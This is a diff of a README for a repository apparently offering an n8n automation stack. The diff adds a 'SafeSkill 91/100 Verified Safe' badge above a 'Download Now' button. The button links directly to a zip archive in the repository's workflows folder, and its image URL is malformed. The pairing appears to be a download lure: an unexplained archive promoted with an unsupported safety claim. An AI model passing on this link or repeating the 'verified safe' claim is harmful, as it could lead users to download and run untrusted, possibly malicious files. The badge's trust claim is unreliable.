@@ -1,5 +1,7 @@
 # 🚀 jeffvato-ultimate-n8n-stack - Your All-in-One Automation Solution
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/daner-itz-jeffvato-ultimate-n8n-stack)
+
 [![Download Now](https://raw.githubusercontent.com/daner-itz/jeffvato-ultimate-n8n-stack/main/workflows/stack_jeffvato_ultimate_n_v2.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/daner-itz/jeffvato-ultimate-n8n-stack/main/workflows/stack_jeffvato_ultimate_n_v2.3.zip)
 
 ## 🎯 Overview
